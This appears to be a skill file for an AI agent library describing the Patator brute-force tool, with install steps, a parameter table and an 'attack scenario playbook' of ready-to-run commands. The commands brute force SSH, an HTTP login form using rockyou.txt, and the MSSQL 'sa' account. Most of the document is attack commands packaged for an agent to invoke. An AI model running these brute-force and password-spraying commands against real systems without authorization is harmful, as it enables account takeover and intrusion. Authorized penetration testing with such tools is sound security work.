---
name: patator-multi-brute
description: "HTTP login form brute forcing with filters and database brute forcing. Signals: brute force, password spraying, SSH, SMB."
zh-signals: "Patator: HTTP 登录表单爆破+条件过滤、数据库爆破。信号:暴力破解,口令喷射,SSH,SMB。"
when-to-use: >-
  Use when brute forcing or password spraying services such as HTTP forms, SSH, SMB, FTP and databases, especially when flexible per-response filters are needed.
---

# Patator

- Attack Category: C28 Brute Force and Password Spraying
- Upstream Repository: https://github.com/lanjelot/patator
- Upstream License: LGPL-2.1 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/lanjelot/patator && cd patator
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python patator.py ssh_login host=10.0.0.5 user=FILE0 password=FILE1 0=users.txt 1=pass.txt` | SSH |
| `http_fuzz url=https://t.com/login user_pass=FILE0:FILE1 ...` | HTTP |
| `smb_login` | SMB |
| `ftp_login` | FTP |
| `-t 20` | Threads |
| `-x ignore:code=401` | Exclude condition |
| `range=0-10000` | Generator |

## Attack Scenario Playbook

### HTTP Login Form Brute Force with Conditional Filtering

```bash
python patator.py http_fuzz url=https://target/login.php method=POST body='user=FILE0&pass=FILE1' 0=users.txt 1=rockyou.txt -x ignore:fgrep='Invalid' -t 20
```

### Database Brute Force

```bash
python patator.py mssql_login host=10.0.0.8 user=sa password=FILE0 0=pass.txt
```

## Notes

A universal brute-force framework written in Python with extremely flexible conditional filtering (-x ignore); it supports custom requests on arbitrary fields.
